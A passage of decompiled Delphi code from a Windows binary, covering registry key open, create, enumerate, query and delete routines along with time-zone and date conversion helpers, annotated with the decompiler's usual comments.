  result = *(HKEY *)(a1 + 4);
  if ( result )
  {
    if ( !*(_BYTE *)(a1 + 12) )
      RegFlushKey(result);
    RegCloseKey_0(*(HKEY *)(a1 + 4));
    *(_DWORD *)(a1 + 4) = 0;
    return (HKEY)sub_406C44((_DWORD *)(a1 + 16));
  }
  return result;
}

//----- (00441F30) --------------------------------------------------------
int __fastcall sub_441F30(int a1, char a2, int a3, char a4)
{
  int v4; // esi
  char v5; // bl
  int v6; // edi
  HKEY v7; // eax
  int v8; // edx
  int v9; // ecx

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v4 = a3;
  v5 = a2;
  v6 = a1;
  v7 = sub_442980(a1, HKEY_CURRENT_USER);
  *(_BYTE *)(v6 + 12) = 1;
  *(_DWORD *)(v6 + 24) = v4;
  if ( a4 && (unsigned __int8)sub_425F70((int)v7, v8, v9) )
    *(_DWORD *)(v6 + 24) |= 0x100u;
  if ( v5 )
    System::__linkproc__ AfterConstruction(v6);
  return v6;
}
// 441F42: variable 'a3' is possibly undefined
// 441F44: variable 'a2' is possibly undefined
// 441F61: variable 'v8' is possibly undefined
// 441F61: variable 'v9' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (00441F90) --------------------------------------------------------
Registry::TRegistry *__fastcall sub_441F90(Registry::TRegistry *a1, __int32 a2)
{
  bool v3; // al
  DWORD v4; // ebx
  Registry::TRegistry *v5; // esi
  WCHAR *v6; // eax
  LONG v7; // eax
  int v8; // eax
  Registry::TRegistry *v9; // ebx
  int BaseKey; // eax
  LONG v11; // eax
  HKEY v12; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-5Ch] BYREF
  void *v15; // [esp-14h] [ebp-58h]
  LPCWSTR v16; // [esp-10h] [ebp-54h]
  unsigned int v17[2]; // [esp-Ch] [ebp-50h] BYREF
  int *v18; // [esp-4h] [ebp-48h]
  int System__AnsiString; // [esp+8h] [ebp-3Ch] BYREF
  DWORD cSubKeys; // [esp+Ch] [ebp-38h] BYREF
  int v21; // [esp+10h] [ebp-34h]
  HKEY hKey; // [esp+28h] [ebp-1Ch]
  int v23; // [esp+2Ch] [ebp-18h]
  bool v24; // [esp+33h] [ebp-11h]
  DWORD cbName; // [esp+34h] [ebp-10h] BYREF
  Registry::TRegistry *v26; // [esp+38h] [ebp-Ch]
  int v27; // [esp+3Ch] [ebp-8h] BYREF
  _WORD *v28; // [esp+40h] [ebp-4h] BYREF
  int savedregs; // [esp+44h] [ebp+0h] BYREF

  System__AnsiString = 0;
  v28 = 0;
  v27 = 0;
  v26 = a1;
  v18 = &savedregs;
  v17[1] = (unsigned int)&loc_442159;
  v17[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v17);
  sub_407030((volatile __int32 *)&v28, a2);
  v3 = !v28 || *v28 != 92;
  v24 = v3;
  if ( !v3 )
    sub_407B20((volatile __int32 *)&v28, 1, 1);
  v23 = *((_DWORD *)v26 + 1);
  hKey = (HKEY)Registry::TRegistry::GetKey(v26, a2);
  if ( hKey )
  {
    v16 = (LPCWSTR)&savedregs;
    v15 = &loc_4420C9;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_442970((int)v26, (int)hKey);
    if ( (unsigned __int8)sub_4423B0((int)v26, &cSubKeys) )
    {
      sub_406D90(&v27, 0, v21 + 1);
      v4 = cSubKeys - 1;
      if ( (int)(cSubKeys - 1) >= 0 )
      {
        do
        {
          cbName = v21 + 1;
          v5 = v26;
          v6 = (WCHAR *)sub_407790(v27);
          v7 = RegEnumKeyExW(hKey, v4, v6, &cbName, 0, 0, 0, 0);
          *((_DWORD *)v5 + 7) = v7;
          if ( !v7 )
          {
            v8 = sub_407790(v27);
            unknown_libname_50(&System__AnsiString, v8);
            sub_441F90(v26, System__AnsiString);
          }
          --v4;
        }
        while ( v4 != -1 );
      }
    }
    __writefsdword(0, (unsigned int)ExceptionList);
    v16 = (LPCWSTR)&loc_4420D0;
    sub_442970((int)v26, v23);
    RegCloseKey_0(hKey);
  }
  v9 = v26;
  if ( dword_46746C )
  {
    v16 = 0;
    v15 = (void *)(*((_DWORD *)v26 + 6) & 0x300);
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_407790((int)v28);
    BaseKey = Registry::TRegistry::GetBaseKey(v26, v24);
    v11 = dword_46746C(BaseKey, ExceptionList, v15, v16);
  }
  else
  {
    v16 = (LPCWSTR)sub_407790((int)v28);
    v12 = (HKEY)Registry::TRegistry::GetBaseKey(v26, v24);
    v11 = RegDeleteKeyW(v12, v16);
  }
  *((_DWORD *)v9 + 7) = v11;
  LOBYTE(v9) = v11 == 0;
  __writefsdword(0, v17[0]);
  v18 = (int *)&loc_442160;
  sub_406C44(&System__AnsiString);
  sub_406CA4((int)&v27, 2);
  return v9;
}
// 46746C: invalid function type has been ignored
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 46746C: using guessed type int (__stdcall *dword_46746C)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00442170) --------------------------------------------------------
int sub_442170()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  sub_441EF0(v0);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (004421C0) --------------------------------------------------------
DWORD __fastcall sub_4421C0(int a1, int a2, BYTE *a3, DWORD cbData, char *a5)
{
  const WCHAR *v7; // eax
  LONG v8; // eax
  DWORD v9; // edx
  char v10; // al
  DWORD Type[2]; // [esp+Ch] [ebp-8h] BYREF

  Type[1] = (DWORD)a3;
  Type[0] = 0;
  v7 = (const WCHAR *)sub_407790(a2);
  v8 = RegQueryValueExW_0(*(HKEY *)(a1 + 4), v7, 0, Type, a3, &cbData);
  *(_DWORD *)(a1 + 28) = v8;
  if ( v8 )
  {
    cbData = 0;
    Type[0] = 0;
  }
  v9 = cbData;
  switch ( Type[0] )
  {
    case 1u:
      v10 = 1;
      break;
    case 2u:
      v10 = 2;
      break;
    case 4u:
      v10 = 3;
      break;
    case 3u:
      v10 = 4;
      break;
    default:
      v10 = 0;
      break;
  }
  *a5 = v10;
  return v9;
}

//----- (00442250) --------------------------------------------------------
int __fastcall sub_442250(int a1, int a2, int a3)
{
  const WCHAR *v5; // eax
  LONG v6; // eax
  int v7; // edx
  char v8; // al
  DWORD Type; // [esp+Ch] [ebp-8h] BYREF
  int v11; // [esp+10h] [ebp-4h]

  v11 = a2;
  sub_4051B8((_WORD *)a3, 8, 0);
  v5 = (const WCHAR *)sub_407790(v11);
  v6 = RegQueryValueExW_0(*(HKEY *)(a1 + 4), v5, 0, &Type, 0, (LPDWORD)(a3 + 4));
  *(_DWORD *)(a1 + 28) = v6;
  LOBYTE(v7) = v6 == 0;
  switch ( Type )
  {
    case 1u:
      v8 = 1;
      break;
    case 2u:
      v8 = 2;
      break;
    case 4u:
      v8 = 3;
      break;
    case 3u:
      v8 = 4;
      break;
    default:
      v8 = 0;
      break;
  }
  *(_BYTE *)a3 = v8;
  return v7;
}
// 4422C2: variable 'v7' is possibly undefined

//----- (004422D0) --------------------------------------------------------
int __fastcall sub_4422D0(int a1, int a2)
{
  char v3[4]; // [esp+8h] [ebp-8h] BYREF
  int v4; // [esp+Ch] [ebp-4h]

  if ( (unsigned __int8)sub_442250(a1, a2, (int)v3) )
    return v4;
  else
    return -1;
}
// 4422D0: using guessed type char var_8[4];

//----- (004423B0) --------------------------------------------------------
LONG __fastcall sub_4423B0(int a1, _WORD *lpcSubKeys)
{
  LONG result; // eax

  sub_4051B8(lpcSubKeys, 28, 0);
  result = RegQueryInfoKeyW(
             *(HKEY *)(a1 + 4),
             0,
             0,
             0,
             (LPDWORD)lpcSubKeys,
             (LPDWORD)lpcSubKeys + 1,
             0,
             (LPDWORD)lpcSubKeys + 2,
             (LPDWORD)lpcSubKeys + 3,
             (LPDWORD)lpcSubKeys + 4,
             0,
             (PFILETIME)(lpcSubKeys + 10));
  *(_DWORD *)(a1 + 28) = result;
  LOBYTE(result) = result == 0;
  if ( *((_BYTE *)off_4681F4 + 12) )
  {
    if ( *off_4681E4 == 2 )
    {
      *((_DWORD *)lpcSubKeys + 1) *= 2;
      *((_DWORD *)lpcSubKeys + 3) *= 2;
    }
  }
  return result;
}
// 4681E4: using guessed type int *off_4681E4;
// 4681F4: using guessed type int *off_4681F4;

//----- (004424B0) --------------------------------------------------------
BOOL __fastcall sub_4424B0(_DWORD *a1, __int32 a2, char a3)
{
  bool v4; // bl
  HKEY v5; // edi
  const WCHAR *v6; // eax
  LONG v7; // eax
  HKEY v8; // edi
  const WCHAR *v9; // eax
  LONG v10; // eax
  REGSAM v12; // [esp-1Ch] [ebp-40h]
  _WORD *v13; // [esp-18h] [ebp-3Ch]
  REGSAM v14; // [esp-14h] [ebp-38h]
  _DWORD v15[6]; // [esp-Ch] [ebp-30h] BYREF
  _DWORD *v16; // [esp+Ch] [ebp-18h]
  _DWORD *v17; // [esp+10h] [ebp-14h]
  DWORD dwDisposition; // [esp+14h] [ebp-10h] BYREF
  HKEY phkResult; // [esp+18h] [ebp-Ch] BYREF
  bool v20; // [esp+1Eh] [ebp-6h]
  char v21; // [esp+1Fh] [ebp-5h]
  _WORD *v22; // [esp+20h] [ebp-4h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v22 = 0;
  v21 = a3;
  v15[2] = &savedregs;
  v15[1] = &loc_4425E9;
  v15[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  sub_407030((volatile __int32 *)&v22, a2);
  v4 = !v22 || *v22 != 92;
  if ( !v4 )
    sub_407B20((volatile __int32 *)&v22, 1, 1);
  phkResult = 0;
  if ( v21 && v22 )
  {
    if ( a1[1] && v4 )
      v8 = (HKEY)a1[1];
    else
      v8 = (HKEY)a1[2];
    v16 = a1;
    v12 = a1[6];
    v9 = (const WCHAR *)sub_407790((int)v22);
    v10 = RegCreateKeyExW(v8, v9, 0, 0, 0, v12, 0, &phkResult, &dwDisposition);
    v16[7] = v10;
    v20 = v10 == 0;
  }
  else
  {
    if ( a1[1] && v4 )
      v5 = (HKEY)a1[1];
    else
      v5 = (HKEY)a1[2];
    v17 = a1;
    v14 = a1[6];
    v6 = (const WCHAR *)sub_407790((int)v22);
    v7 = RegOpenKeyExW_0(v5, v6, 0, v14, &phkResult);
    v17[7] = v7;
    v20 = v7 == 0;
  }
  if ( v20 )
  {
    if ( v4 && a1[1] != 0 )
    {
      v13 = v22;
      sub_4079F0((int *)&v22, 3);
    }
    sub_441EC0((int)a1, (int)phkResult, (int)v22);
  }
  __writefsdword(0, (unsigned int)v13);
  sub_406C44(&v22);
  return v20;
}
// 4425D8: variable 'v13' is possibly undefined

//----- (00442610) --------------------------------------------------------
BOOL __fastcall sub_442610(int a1, __int32 a2)
{
  bool v3; // bl
  int v4; // edi
  const WCHAR *v5; // eax
  LONG v6; // eax
  const WCHAR *v7; // eax
  LONG v8; // eax
  const WCHAR *v9; // eax
  LONG v10; // eax
  _WORD *v12; // [esp-18h] [ebp-48h]
  _DWORD v13[6]; // [esp-Ch] [ebp-3Ch] BYREF
  int v14; // [esp+Ch] [ebp-24h]
  HKEY v15; // [esp+10h] [ebp-20h]
  int v16; // [esp+14h] [ebp-1Ch]
  HKEY v17; // [esp+18h] [ebp-18h]
  int v18; // [esp+1Ch] [ebp-14h]
  HKEY hKey; // [esp+20h] [ebp-10h]
  HKEY phkResult; // [esp+24h] [ebp-Ch] BYREF
  bool v21; // [esp+2Bh] [ebp-5h]
  _WORD *v22; // [esp+2Ch] [ebp-4h] BYREF
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v22 = 0;
  v13[2] = &savedregs;
  v13[1] = &loc_442820;
  v13[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  sub_407030((volatile __int32 *)&v22, a2);
  v3 = !v22 || *v22 != 92;
  if ( !v3 )
    sub_407B20((volatile __int32 *)&v22, 1, 1);
  phkResult = 0;
  v4 = *(_DWORD *)(a1 + 24) & 0x300;
  if ( *(_DWORD *)(a1 + 4) && v3 )
    hKey = *(HKEY *)(a1 + 4);
  else
    hKey = *(HKEY *)(a1 + 8);
  v18 = a1;
  v5 = (const WCHAR *)sub_407790((int)v22);
  v6 = RegOpenKeyExW_0(hKey, v5, 0, v4 | 0x20019, &phkResult);
  *(_DWORD *)(v18 + 28) = v6;
  v21 = v6 == 0;
  if ( !v6 )
  {
    *(_DWORD *)(a1 + 24) = v4 | 0x20019;
    if ( v3 && *(_DWORD *)(a1 + 4) != 0 )
    {
      v12 = v22;
      sub_4079F0((int *)&v22, 3);
    }
LABEL_30:
    sub_441EC0(a1, (int)phkResult, (int)v22);
    goto LABEL_31;
  }
  if ( *(_DWORD *)(a1 + 4) && v3 )
    v17 = *(HKEY *)(a1 + 4);
  else
    v17 = *(HKEY *)(a1 + 8);
  v16 = a1;
  v7 = (const WCHAR *)sub_407790((int)v22);
  v8 = RegOpenKeyExW_0(v17, v7, 0, v4 | 0x20009, &phkResult);
  *(_DWORD *)(v16 + 28) = v8;
  v21 = v8 == 0;
  if ( !v8 )
  {
    *(_DWORD *)(a1 + 24) = v4 | 0x20009;
    if ( v3 && *(_DWORD *)(a1 + 4) != 0 )
    {
      v12 = v22;
      sub_4079F0((int *)&v22, 3);
    }
    goto LABEL_30;
  }
  if ( *(_DWORD *)(a1 + 4) && v3 )
    v15 = *(HKEY *)(a1 + 4);
  else
    v15 = *(HKEY *)(a1 + 8);
  v14 = a1;
  v9 = (const WCHAR *)sub_407790((int)v22);
  v10 = RegOpenKeyExW_0(v15, v9, 0, v4 | 1, &phkResult);
  *(_DWORD *)(v14 + 28) = v10;
  v21 = v10 == 0;
  if ( !v10 )
  {
    *(_DWORD *)(a1 + 24) = v4 | 1;
    if ( v3 && *(_DWORD *)(a1 + 4) != 0 )
    {
      v12 = v22;
      sub_4079F0((int *)&v22, 3);
    }
    goto LABEL_30;
  }
LABEL_31:
  __writefsdword(0, (unsigned int)v12);
  sub_406C44(&v22);
  return v21;
}
// 44280F: variable 'v12' is possibly undefined

//----- (00442850) --------------------------------------------------------
int __fastcall sub_442850(int a1, int a2)
{
  unsigned int v5[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v6; // [esp-4h] [ebp-18h]
  char v7[5]; // [esp+Bh] [ebp-9h] BYREF
  int System__AnsiString; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  System__AnsiString = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_4428B6;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_4421C0(a1, a2, (BYTE *)&v7[1], 4u, v7);
  if ( v7[0] != 3 )
  {
    sub_4428D0(a1, a2, &System__AnsiString);
    *(_DWORD *)&v7[1] = Sysutils::StrToIntDef(System__AnsiString, 0);
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_4428BD;
  sub_406C44(&System__AnsiString);
  return *(_DWORD *)&v7[1];
}

//----- (004428D0) --------------------------------------------------------
_DWORD *__fastcall sub_4428D0(int a1, int a2, int *a3)
{
  int v5; // eax
  DWORD v6; // esi
  BYTE *v7; // eax
  int v8; // ecx
  _DWORD *result; // eax
  int i; // esi
  char v11[5]; // [esp+Fh] [ebp-5h] BYREF

  *(_DWORD *)&v11[1] = a2;
  v5 = sub_4422D0(a1, a2);
  v6 = v5;
  if ( v5 <= 0 )
    return sub_406C44(a3);
  sub_406D90(a3, 0, v5 / 2);
  v7 = (BYTE *)sub_407790(*a3);
  sub_4421C0(a1, *(int *)&v11[1], v7, v6, v11);
  if ( v11[0] != 1 && v11[0] != 2 )
    return sub_406C44(a3);
  result = (_DWORD *)*a3;
  if ( *a3 )
    result = (_DWORD *)*(result - 1);
  if ( (int)result > 0 )
  {
    for ( i = 1; *(_WORD *)(*a3 + 2 * i - 2); ++i )
    {
      result = (_DWORD *)((char *)result - 1);
      if ( !result )
        return result;
    }
    return sub_407890(a3, i - 1, v8);
  }
  return result;
}
// 442949: variable 'v8' is possibly undefined

//----- (00442970) --------------------------------------------------------
int __fastcall sub_442970(int result, int a2)
{
  *(_DWORD *)(result + 4) = a2;
  return result;
}

//----- (00442980) --------------------------------------------------------
HKEY __fastcall sub_442980(int a1, HKEY a2)
{
  HKEY result; // eax

  result = *(HKEY *)(a1 + 8);
  if ( a2 != result )
  {
    if ( *(_BYTE *)(a1 + 20) )
    {
      RegCloseKey_0(result);
      *(_BYTE *)(a1 + 20) = 0;
    }
    *(_DWORD *)(a1 + 8) = a2;
    return sub_441EF0(a1);
  }
  return result;
}

//----- (004429B0) --------------------------------------------------------
_DWORD *__usercall sub_4429B0@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<edi>)
{
  DWORD v3; // ebx
  DWORD v4; // esi
  WCHAR *v5; // eax
  int v6; // eax
  PFILETIME ExceptionList; // [esp-Ch] [ebp-44h] BYREF
  void *v9; // [esp-8h] [ebp-40h]
  int *v10; // [esp-4h] [ebp-3Ch]
  void *v11; // [esp+0h] [ebp-38h]
  int v12; // [esp+8h] [ebp-30h] BYREF
  DWORD cSubKeys; // [esp+Ch] [ebp-2Ch] BYREF
  int v14; // [esp+10h] [ebp-28h]
  DWORD cbName; // [esp+28h] [ebp-10h] BYREF
  _DWORD *v16; // [esp+2Ch] [ebp-Ch]
  int v17; // [esp+30h] [ebp-8h]
  int v18; // [esp+34h] [ebp-4h] BYREF
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v12 = 0;
  v18 = 0;
  v16 = a2;
  v17 = a1;
  v10 = &savedregs;
  v9 = &loc_442A70;
  ExceptionList = (PFILETIME)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(_DWORD *, _DWORD))(*a2 + 4))(a2, *a2);
  if ( (unsigned __int8)sub_4423B0(v17, &cSubKeys) )
  {
    sub_406D90(&v18, 0, v14 + 2);
    if ( (int)(cSubKeys - 1) >= 0 )
    {
      v3 = cSubKeys;
      v4 = 0;
      do
      {
        cbName = v14 + 1;
        ExceptionList = 0;
        v5 = (WCHAR *)sub_407790(v18);
        RegEnumKeyExW(*(HKEY *)(v17 + 4), v4, v5, &cbName, 0, 0, 0, ExceptionList);
        v6 = sub_407790(v18);
        unknown_libname_50(&v12, v6);
        sub_429140((int)v16, v12, 0, a3);
        ++v4;
        --v3;
      }
      while ( v3 );
    }
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_442A77;
  sub_406C44(&v12);
  return sub_406C44(&v18);
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);

//----- (00442A80) --------------------------------------------------------
_DWORD *__usercall sub_442A80@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<edi>)
{
  int v3; // ebx
  DWORD v4; // esi
  WCHAR *v5; // eax
  int v6; // eax
  LPDWORD ExceptionList; // [esp-Ch] [ebp-44h] BYREF
  void *v9; // [esp-8h] [ebp-40h]
  int *v10; // [esp-4h] [ebp-3Ch]
  void *v11; // [esp+0h] [ebp-38h]
  int v12; // [esp+8h] [ebp-30h] BYREF
  DWORD cSubKeys[2]; // [esp+Ch] [ebp-2Ch] BYREF
  int v14; // [esp+14h] [ebp-24h]
  int v15; // [esp+18h] [ebp-20h]
  DWORD cbValueName; // [esp+28h] [ebp-10h] BYREF
  _DWORD *v17; // [esp+2Ch] [ebp-Ch]
  int v18; // [esp+30h] [ebp-8h]
  int v19; // [esp+34h] [ebp-4h] BYREF
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v12 = 0;
  v19 = 0;
  v17 = a2;
  v18 = a1;
  v10 = &savedregs;
  v9 = &loc_442B40;
  ExceptionList = (LPDWORD)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(_DWORD *, _DWORD))(*a2 + 4))(a2, *a2);
  if ( (unsigned __int8)sub_4423B0(v18, cSubKeys) )
  {
    sub_406D90(&v19, 0, v15 + 2);
    if ( v14 - 1 >= 0 )
    {
      v3 = v14;
      v4 = 0;
      do
      {
        cbValueName = v15 + 1;
        ExceptionList = 0;
        v5 = (WCHAR *)sub_407790(v19);
        RegEnumValueW(*(HKEY *)(v18 + 4), v4, v5, &cbValueName, 0, 0, 0, ExceptionList);
        v6 = sub_407790(v19);
        unknown_libname_50(&v12, v6);
        sub_429140((int)v17, v12, 0, a3);
        ++v4;
        --v3;
      }
      while ( v3 );
    }
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_442B47;
  sub_406C44(&v12);
  return sub_406C44(&v19);
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 442A80: using guessed type DWORD cSubKeys[2];

//----- (00442B90) --------------------------------------------------------
_DWORD *__fastcall sub_442B90(int a1, int a2, char a3, int *a4)
{
  BYTE *v6; // eax
  int v7; // eax
  int v8; // eax
  BYTE *v9; // ebx
  BYTE *v10; // ebx
  DWORD v12; // [esp-10h] [ebp-30h]
  unsigned int v13[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v14; // [esp-4h] [ebp-24h]
  void *v15; // [esp+Ch] [ebp-14h] BYREF
  int v16; // [esp+10h] [ebp-10h] BYREF
  DWORD cbData; // [esp+14h] [ebp-Ch]
  char v18; // [esp+1Bh] [ebp-5h]
  BYTE *v19; // [esp+1Ch] [ebp-4h] BYREF
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v15 = 0;
  v19 = 0;
  v18 = a3;
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_442D0C;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  sub_406C44(a4);
  if ( (unsigned __int8)sub_442250(a1, a2, (int)&v16) && (int)cbData > 0 )
  {
    if ( (_BYTE)v16 )
    {
      if ( (unsigned __int8)(v16 - 1) < 2u )
      {
        sub_406D90(a4, 0, cbData);
        v12 = cbData;
        v6 = (BYTE *)sub_407790(*a4);
        sub_4421C0(a1, a2, v6, v12, (char *)&v16);
        sub_424610(a4);
        goto LABEL_19;
      }
      if ( (_BYTE)v16 == 3 )
      {
        if ( v18 )
        {
          v7 = sub_442850(a1, a2);
          sub_4154B0(v7, 8, (int *)&v15);
          sub_407968(a4, L"dword:", v15);
        }
        else
        {
          v8 = sub_442850(a1, a2);
          sub_415150(v8, a4);
        }
        goto LABEL_19;
      }
      if ( (_BYTE)v16 != 4 )
        goto LABEL_19;
    }
    sub_408B34(&v19, (int)dword_442B54);
    System::__linkproc__ DynArraySetLength(cbData);
    sub_4421C0(a1, a2, v19, cbData, (char *)&v16);
    if ( v18 )
    {
      v9 = v19;
      if ( v19 )
        v9 = (BYTE *)*((_DWORD *)v19 - 1);
      sub_441DD0((int)v19, (int)(v9 - 1), (int)L"hex:", a4);
    }
    else
    {
      v10 = v19;
      if ( v19 )
        v10 = (BYTE *)*((_DWORD *)v19 - 1);
      sub_441DD0((int)v19, (int)(v10 - 1), 0, a4);
    }
  }
LABEL_19:
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_442D13;
  sub_406C44(&v15);
  return sub_408B34(&v19, (int)dword_442B54);
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 442B54: using guessed type int dword_442B54[7];
// 442D28: using guessed type wchar_t aDword[7];
// 442D44: using guessed type wchar_t aHex[5];

//----- (00442D50) --------------------------------------------------------
void sub_442D50()
{
  ++dword_46EDC8;
}
// 46EDC8: using guessed type int dword_46EDC8;

//----- (00442D60) --------------------------------------------------------
LONG sub_442D60()
{
  switch ( dword_46EE84 )
  {
    case 0:
      return TimeZoneInformation.Bias;
    case 1:
      return TimeZoneInformation.StandardBias + TimeZoneInformation.Bias;
    case 2:
      return TimeZoneInformation.DaylightBias + TimeZoneInformation.Bias;
  }
  return 0;
}
// 46EE84: using guessed type int dword_46EE84;

//----- (00442DB0) --------------------------------------------------------
long double __stdcall sub_442DB0(double a1)
{
  return (double)((long double)sub_442D60() / 1440.0 + a1);
}

//----- (00442DE0) --------------------------------------------------------
long double __fastcall sub_442DE0(int a1, _SYSTEMTIME *a2, double a3)
{
  struct _SYSTEMTIME UniversalTime; // [esp+0h] [ebp-28h] BYREF
  SYSTEMTIME LocalTime; // [esp+10h] [ebp-18h] BYREF
  double v7; // [esp+20h] [ebp-8h] BYREF

  if ( dword_46EE84 == -1 )
    return (double)sub_442DB0(a3);
  if ( a3 >= (long double)dbl_467478 )
  {
    if ( a3 > (long double)dbl_467480 )
      a3 = dbl_467480;
  }
  else
  {
    a3 = dbl_467478;
  }
  Sysutils::DateTimeToSystemTime((const int)&LocalTime, a2);
  Guitesting::TGUITestCase::Hide(&UniversalTime, 16);
  if ( !TzSpecificLocalTimeToSystemTime(&TimeZoneInformation, &LocalTime, &UniversalTime)
    || !(unsigned __int8)sub_417A1C(&UniversalTime.wYear, &v7) )
  {
    return (double)sub_442DB0(a3);
  }
  return v7;
}
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 46EE84: using guessed type int dword_46EE84;

//----- (00442E90) --------------------------------------------------------
__int64 __stdcall sub_442E90(double a1)
{
  __int64 v2; // [esp+0h] [ebp-8h]

  v2 = sub_443240(a1, 25569.0);
  if ( a1 < 25569.0 )
    return -v2;
  return v2;
}

//----- (00442EE0) --------------------------------------------------------
__int64 __fastcall sub_442EE0(int a1, _SYSTEMTIME *a2, double a3)
{
  long double v4; // fst7

  v4 = sub_442DE0(a1, a2, a3);
  return sub_442E90(v4);
}

//----- (00442F10) --------------------------------------------------------
long double __usercall sub_442F10@<st0>(unsigned __int16 a1@<ax>, unsigned __int16 a2@<dx>, long double a3@<st0>)
{
  unsigned __int16 v3; // ax
  int v4; // edx
  bool v5; // zf
  bool v6; // sf
  int v7; // edx
  int v9; // [esp+0h] [ebp-1Ch]
  unsigned __int16 v10; // [esp+8h] [ebp-14h]
  double v11; // [esp+Ch] [ebp-10h]

  v11 = 0.0;
  v3 = sub_4430F0(a1, a2);
  v4 = v3 - 7;
  v5 = v4 == v3;
  v6 = v4 - v3 < 0;
  v7 = v4 - v3;
  if ( v6 ^ (v3 - 7 >= v3) | v5 )
  {
    v9 = v7 - 1;
    v10 = v3;
    do
    {
      Sysutils::EncodeDate(a1, a2, v10);
      v11 = a3;
      if ( sub_443140(a3) == 7 )
        break;
      --v10;
      ++v9;
    }
    while ( v9 );
  }
  return v11;
}

//----- (00442F90) --------------------------------------------------------
__int64 sub_442F90()
{
  __int64 v1; // [esp+0h] [ebp-10h]
  struct _FILETIME SystemTimeAsFileTime; // [esp+8h] [ebp-8h] BYREF

  SystemTimeAsFileTime.dwLowDateTime = 0;
  SystemTimeAsFileTime.dwHighDateTime = 0;
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
  v1 = System::__linkproc__ _lldiv(10000000, 0);
  if ( v1 > qword_467490 )
    v1 = -1i64;
  if ( !v1 )
    return 1i64;
  return v1;
}
// 408590: using guessed type __int64 __stdcall System::__linkproc__ _lldiv(_DWORD, _DWORD);
// 467490: using guessed type __int64 qword_467490;

//----- (00443020) --------------------------------------------------------
int __usercall sub_443020@<eax>(long double a1@<st0>)
{
  long double v1; // fst7
  long double v2; // fst7
  long double v3; // fst7
  int result; // eax
  unsigned __int16 v5; // [esp+Ah] [ebp-6h] BYREF
  unsigned __int16 v6; // [esp+Ch] [ebp-4h] BYREF
  int System__TDateTime; // [esp+Eh] [ebp-2h] BYREF

  Sysutils::Date();
  Sysutils::DecodeDate((const int)&System__TDateTime, &v6, &v5, (unsigned __int16 *)COERCE_UNSIGNED_INT64(a1));
  v1 = sub_442F10(System__TDateTime, 3u, a1);
  dbl_467498 = v1;
  v2 = sub_442F10(System__TDateTime, 0xAu, v1);
  dbl_4674A0 = v2;
  v3 = sub_442F10((unsigned __int16)System__TDateTime - 1, 3u, v2);
  dbl_4674A8 = v3;
  dbl_4674B0 = sub_442F10((unsigned __int16)System__TDateTime - 1, 0xAu, v3);
  dword_46EE88 = 0;
  dword_46EE8C = 1088673440;
  result = 0;
  dword_46EE90 = 0;
  dword_46EE94 = 1088715328;
  return result;
}
// 443048: inconsistent fpu stack
// 44305C: inconsistent fpu stack
// 443071: inconsistent fpu stack
// 443086: inconsistent fpu stack
// 467498: using guessed type double dbl_467498;
// 4674A0: using guessed type double dbl_4674A0;
// 4674A8: using guessed type double dbl_4674A8;
// 4674B0: using guessed type double dbl_4674B0;
// 46EE88: using guessed type int dword_46EE88;
// 46EE8C: using guessed type int dword_46EE8C;
// 46EE90: using guessed type int dword_46EE90;
// 46EE94: using guessed type int dword_46EE94;

//----- (004430C0) --------------------------------------------------------
int __usercall sub_4430C0@<eax>(long double a1@<st0>)
{
  _SYSTEMTIME *v1; // edx

  dword_46EE84 = GetTimeZoneInformation(&TimeZoneInformation);
  qword_467470 = sub_442EE0(dword_46EE84, v1, 0.0);
  return sub_443020(a1);
}
// 4430D6: variable 'v1' is possibly undefined
// 467470: using guessed type __int64 qword_467470;
// 46EE84: using guessed type int dword_46EE84;

//----- (004430F0) --------------------------------------------------------
